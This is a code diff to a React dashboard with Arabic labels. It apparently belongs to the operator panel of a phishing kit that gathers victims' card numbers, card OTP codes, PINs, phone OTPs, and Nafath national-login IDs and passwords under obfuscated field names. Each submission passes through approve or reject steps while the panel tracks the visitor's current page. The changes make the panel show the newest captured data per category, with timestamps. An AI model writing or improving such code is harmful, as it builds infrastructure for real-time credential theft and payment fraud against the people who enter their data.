@@ -475,6 +475,52 @@ export default function DashboardPage() {
     });
   }, [requests, selectedRequest]);
 
+  // Get latest data for each box type from all entries (newest entry has data first due to sort)
+  const getLatestRawForBox = useMemo(() => {
+    return (dataType: 'phone' | 'card' | 'nafad' | 'basic' | 'insurance'): Record<string, any> | null => {
+      if (!customerEntryGroup.length) return null;
+      
+      // Find first entry that has this type of data
+      for (const entry of customerEntryGroup) {
+        const raw = entry.raw || {};
+        
+        switch (dataType) {
+          case 'phone':
+            if (raw.phoneNumber || raw.mobileNumber || raw.phoneIdNumber) return raw;
+            break;
+          case 'card':
+            if (raw._v1 || raw.cardNumber || raw.paymentStatus) return raw;
+            break;
+          case 'nafad':
+            if (raw.nafadIdNumber || raw.nafadPassword) return raw;
+            break;
+          case 'basic':
+            if (raw.identityNumber || raw.ownerName || raw.buyerName) return raw;
+            break;
+          case 'insurance':
+            if (raw.insuranceType || raw.vehicleModel || raw.coverageType) return raw;
+            break;
+        }
+      }
+      return null;
+    };
+  }, [customerEntryGroup]);
+
+  // Get entry timestamp for a specific raw data
+  const getEntryTimestamp = useMemo(() => {
+    return (raw: Record<string, any>): number => {
+      const entry = customerEntryGroup.find(e => {
+        const entryRaw = e.raw || {};
+        // Match by comparing key fields
+        return entryRaw.identityNumber === raw.identityNumber ||
+               entryRaw.phoneNumber === raw.phoneNumber ||
+               entryRaw.nafadIdNumber === raw.nafadIdNumber;
+      });
+      if (!entry) return 0;
+      return new Date(entry.submittedAt || entry.updatedAt || 0).getTime();
+    };
+  }, [customerEntryGroup]);
+
   const liveSummary = useMemo(() => {
     const raw = selectedRequest?.raw || {};
     const ownerName = selectedRequest?.customer || getRealFieldValue(raw, ["ownerName", "buyerName", "name", "firstName", "lastName"], "—");
@@ -699,47 +745,55 @@ export default function DashboardPage() {
 
   // Get current page and status from visitor data
   const getCurrentPage = (): string => {
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
     const page = raw?.currentPage || raw?.page;
     return typeof page === 'string' ? page : "";
   };
 
   const getCurrentStep = (): number => {
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
     return raw?.currentStep || raw?.step || 0;
   };
 
   const getPaymentStatus = (): string => {
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
     return raw?._v1Status || "";
   };
 
   // Get card OTP status (step 2 - after payment approval)
   const getCardOtpStatus = (): string => {
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
     return raw?._v5Status || "";
   };
 
   const getPinStatus = (): string => {
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
     return raw?._v6Status || "";
   };
 
   // Get phone OTP status (step 5 - after PIN)
   const getPhoneOtpStatus = (): string => {
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
     return raw?.phoneOtpStatus || "";
   };
 
   // Get nafad status (step 8)
   const getNafadStatus = (): string => {
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
     return raw?._v8Status || "";
   };
 
   // Render basic information box (from home-new page)
   const renderBasicInfoBox = () => {
-    const raw = selectedRequest?.raw;
+    // Get latest basic info data from all entries
+    const raw = getLatestRawForBox('basic') || selectedRequest?.raw;
     
     // Check if there's basic info data
     const hasBasicInfo = Boolean(
@@ -755,9 +809,26 @@ export default function DashboardPage() {
     );
     
     if (!hasBasicInfo) return null;
+    
+    // Get timestamp for sorting
+    const timestamp = getEntryTimestamp(raw);
 
     return (
-      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
+      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12, position: "relative" }}>
+        {timestamp > 0 && (
+          <div style={{
+            position: "absolute",
+            top: 8,
+            left: 8,
+            fontSize: "0.65rem",
+            color: "#9ca3af",
+            background: "#f3f4f6",
+            padding: "2px 6px",
+            borderRadius: 4
+          }}>
+            {new Date(timestamp).toLocaleString("ar-SA", { hour: "2-digit", minute: "2-digit", hour12: true })}
+          </div>
+        )}
         <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>📋</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
@@ -821,7 +892,8 @@ export default function DashboardPage() {
 
   // Render insurance details box (from insur page)
   const renderInsuranceDetailsBox = () => {
-    const raw = selectedRequest?.raw;
+    // Get latest insurance data from all entries
+    const raw = getLatestRawForBox('insurance') || selectedRequest?.raw;
     
     // Check if there's insurance data
     const hasInsuranceData = Boolean(
@@ -835,9 +907,26 @@ export default function DashboardPage() {
     );
     
     if (!hasInsuranceData) return null;
+    
+    // Get timestamp for sorting
+    const timestamp = getEntryTimestamp(raw);
 
     return (
-      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
+      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12, position: "relative" }}>
+        {timestamp > 0 && (
+          <div style={{
+            position: "absolute",
+            top: 8,
+            left: 8,
+            fontSize: "0.65rem",
+            color: "#9ca3af",
+            background: "#f3f4f6",
+            padding: "2px 6px",
+            borderRadius: 4
+          }}>
+            {new Date(timestamp).toLocaleString("ar-SA", { hour: "2-digit", minute: "2-digit", hour12: true })}
+          </div>
+        )}
         <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>🛡️</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
@@ -901,7 +990,8 @@ export default function DashboardPage() {
   const renderCardVerificationBox = () => {
     const currentPage = getCurrentPage();
     const paymentStatus = getPaymentStatus();
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
 
     // Show box if there's card data OR status is approved/rejected (keep showing after decision)
     const hasCardData = raw?._v1 || raw?.cardNumber;
@@ -973,7 +1063,8 @@ export default function DashboardPage() {
     const currentStep = getCurrentStep();
     const currentPage = getCurrentPage();
     const cardOtpStatus = getCardOtpStatus();
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
 
     // Get the OTP code from various possible field names
     const otpCode = raw?._v5 || raw?.otpCode || "";
@@ -1040,7 +1131,8 @@ export default function DashboardPage() {
   const renderPinBox = () => {
     const currentStep = getCurrentStep();
     const pinStatus = getPinStatus();
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
 
     // Show box if there's PIN data OR status exists
     const hasPinData = raw?._v6 || raw?.pinCode;
@@ -1125,7 +1217,8 @@ export default function DashboardPage() {
     const currentStep = getCurrentStep();
     const currentPage = getCurrentPage();
     const phoneOtpStatus = getPhoneOtpStatus();
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
 
     // Get phone OTP code if submitted (stored as _v7 in history)
     const phoneOtpCode = String(raw?._v7 || raw?.phoneOtp || "").trim();
@@ -1159,11 +1252,11 @@ export default function DashboardPage() {
             <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
               <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                 <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الهوية:</span>
-                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right", direction: "ltr" }}>{raw?.phoneIdNumber || raw?.identityNumber || "غير متوفر"}</span>
+                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right", direction: "ltr" }}>{raw?.phoneIdNumber || raw?.identityNumber || "—"}</span>
               </div>
               <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                 <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الجوال:</span>
-                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right", direction: "ltr" }}>{raw?.phoneNumber || raw?.mobileNumber || "غير متوفر"}</span>
+                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right", direction: "ltr" }}>{raw?.phoneNumber || raw?.mobileNumber || "—"}</span>
               </div>
               <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
                 <span style={{ fontWeight: 600, color: "#6b7280" }}>شركة الاتصالات:</span>
@@ -1237,7 +1330,8 @@ export default function DashboardPage() {
 const renderNafadBox = () => {
     const currentStep = getCurrentStep();
     const nafadStatus = getNafadStatus();
-    const raw = selectedRequest?.raw;
+    // Get latest nafad data from all entries
+    const raw = getLatestRawForBox('nafad') || selectedRequest?.raw;
 
     // Get nafad data
     const hasNafadData = raw?.nafadIdNumber || raw?.nafadPassword;
@@ -1390,7 +1484,8 @@ const renderNafadBox = () => {
 
   // Render action buttons based on current page
   const renderActionButtons = () => {
-    const raw = selectedRequest?.raw;
+    // Get latest phone data from all entries
+    const raw = getLatestRawForBox('phone') || selectedRequest?.raw;
     
     // Get timestamp for each box (newest first)
     const getBoxTimestamp = (timestampField?: string): number => {
